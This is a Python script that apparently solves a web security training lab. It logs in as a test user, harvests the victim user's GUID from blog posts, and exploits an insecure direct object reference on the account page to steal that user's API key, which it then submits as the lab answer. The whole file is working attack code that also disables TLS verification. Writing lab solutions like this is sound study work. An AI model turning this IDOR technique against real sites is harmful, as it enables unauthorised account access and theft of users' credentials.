import re 
import requests
import urllib3
import sys
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_csrf_token(session, url):
    print("(+) Fetching csrf token ...")
    response = session.get(url , verify=False)
    soup = BeautifulSoup(response.text, "html.parser")
    csrf_token = soup.find("input",{"name":"csrf"})["value"]
    return csrf_token



def find_guid(session ,url):
    print("Finding GUID of Carlos")
    response = session.get(url, verify=False)
    post_ids = re.findall(r'postId=(\w+)"', response.text)
    unique_ids = list(set(post_ids))
    for unique in unique_ids:
        response = session.get(url+"/post?postId="+unique)
        if "carlos" in response.text:
            print("(üòé) Carlos GUID Found ..")
            guid = re.findall(r"userId=(.*)'", response.text)[0]
            return guid




def carlos_api(session , url):
    login_url = url +"/login"
    csrf_token = get_csrf_token(session , login_url)
    guid = find_guid(session, url)
    login_data = {
        "username":"wiener",
        "password":"peter",
        "csrf": csrf_token
    }

    print("(üëÄ) Trying to login ...")
    response = session.post(login_url , data=login_data , verify=False)
    if "Log out" in response.text:
        print("(‚úåÔ∏è) Login Successfully ...")
    else:
        print("Login Failed...")
    cookies = response.cookies.get_dict().get("session")

    print("(üîé)Find API keys of carlos ...")
    response = session.get(url+"/my-account?id="+guid , cookies=cookies , verify=False)
    if "carlos" in response.text:
        api_key = re.search("Your API Key is:(.*)",response.text).group(1)
        api_key = api_key.split("</div>")[0].strip()
        print(f"(+) Extracted API Key: {api_key}")
        submit_url = url +"/submitSolution"
        data = {
                "answer":api_key
                }
        r = session.post(submit_url, data=data , verify=False)
        if "true" in r.text:
                print(f"(+) Congratulations, you solved the lab!")
        else:
             print("(-) Error in submitting api keys")
             sys.exit(-1)
    else:
        print("Failed to find api keys.")




def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url> "% sys.argv[0])
        print("(+) Example: %s www.example.com"% sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    session = requests.Session()
    try:

        print("(+) Validating target ....")
        response = requests.get(url ,verify=False)
        if response.status_code == 200:
            print("(+) Target is reachable..")
        else:
            print("(-) Target is unreachable | Generate new one")
            sys.exit(-1)
    except(requests.exceptions.MissingSchema):
        print("(-) Invalid Url ")
    carlos_api(session ,url)

if __name__ == "__main__":
    main()